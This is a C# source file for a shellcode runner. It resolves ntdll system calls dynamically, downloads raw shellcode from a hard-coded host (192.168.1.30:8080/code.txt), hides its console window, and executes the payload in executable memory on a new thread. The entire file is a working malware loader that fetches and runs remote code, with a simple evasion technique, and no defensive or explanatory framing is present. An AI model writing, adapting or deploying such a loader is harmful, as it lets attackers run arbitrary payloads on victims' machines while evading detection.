using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;

namespace ShellcodeRunner
{
    class Program
    {
        // NT API Constants
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint CREATE_SUSPENDED = 0x00000004;
        const uint WAIT_INFINITE = 0xFFFFFFFF;

        // Function prototypes for NT APIs
        delegate int NtAllocateVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);
        delegate int NtFreeVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint FreeType);
        delegate int NtCreateThreadExDelegate(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Argument, uint CreateFlags, uint ZeroBits, uint StackSize, uint MaximumStackSize, IntPtr AttributeList);
        delegate int NtWaitForSingleObjectDelegate(IntPtr Handle, bool Alertable, IntPtr Timeout);
        delegate int NtProtectVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool FreeConsole();

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
            // Load ntdll.dll module
            IntPtr ntdllModule = LoadLibrary("ntdll.dll");

            // Get addresses of NT APIs from IAT
            IntPtr ntAllocateVirtualMemoryAddr = GetProcAddress(ntdllModule, "NtAllocateVirtualMemory");
            IntPtr ntFreeVirtualMemoryAddr = GetProcAddress(ntdllModule, "NtFreeVirtualMemory");
            IntPtr ntCreateThreadExAddr = GetProcAddress(ntdllModule, "NtCreateThreadEx");
            IntPtr ntWaitForSingleObjectAddr = GetProcAddress(ntdllModule, "NtWaitForSingleObject");
            IntPtr ntProtectVirtualMemoryAddr = GetProcAddress(ntdllModule, "NtProtectVirtualMemory");

            // Create delegates for NT APIs
            NtAllocateVirtualMemoryDelegate ntAllocateVirtualMemory = (NtAllocateVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(ntAllocateVirtualMemoryAddr, typeof(NtAllocateVirtualMemoryDelegate));
            NtFreeVirtualMemoryDelegate ntFreeVirtualMemory = (NtFreeVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(ntFreeVirtualMemoryAddr, typeof(NtFreeVirtualMemoryDelegate));
            NtCreateThreadExDelegate ntCreateThreadEx = (NtCreateThreadExDelegate)Marshal.GetDelegateForFunctionPointer(ntCreateThreadExAddr, typeof(NtCreateThreadExDelegate));
            NtWaitForSingleObjectDelegate ntWaitForSingleObject = (NtWaitForSingleObjectDelegate)Marshal.GetDelegateForFunctionPointer(ntWaitForSingleObjectAddr, typeof(NtWaitForSingleObjectDelegate));
            NtProtectVirtualMemoryDelegate ntProtectVirtualMemory = (NtProtectVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(ntProtectVirtualMemoryAddr, typeof(NtProtectVirtualMemoryDelegate));

            WebClient client = new WebClient();
            string url = "http://192.168.1.30:8080/code.txt";
            byte[] shellcode = client.DownloadData(url);

            FreeConsole();

            IntPtr allocMemAddress = IntPtr.Zero;
            IntPtr size = (IntPtr)shellcode.Length;

            // Allocate read-write memory using NtAllocateVirtualMemory
            int status = ntAllocateVirtualMemory(GetCurrentProcess(), ref allocMemAddress, IntPtr.Zero, ref size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            // Copy the shellcode to the allocated memory
            Marshal.Copy(shellcode, 0, allocMemAddress, shellcode.Length);

            // Change the memory protection to read-execute using NtProtectVirtualMemory
            uint oldProtect = 0;
            status = ntProtectVirtualMemory(GetCurrentProcess(), ref allocMemAddress, ref size, 0x20, out oldProtect);  // NewProtect = PAGE_EXECUTE_READ

            IntPtr threadHandle = IntPtr.Zero;

            // Create a new thread and execute the shellcode using NtCreateThreadEx
            status = ntCreateThreadEx(out threadHandle, 0x1FFFFF, IntPtr.Zero, GetCurrentProcess(), allocMemAddress, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero);

            // Wait for the thread to finish using NtWaitForSingleObject
            ntWaitForSingleObject(threadHandle, false, IntPtr.Zero);

            // Free the allocated memory using NtFreeVirtualMemory
            status = ntFreeVirtualMemory(GetCurrentProcess(), ref allocMemAddress, ref size, 0x8000);  // FreeType = MEM_RELEASE

            Console.WriteLine("Shellcode executed");
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    }
}
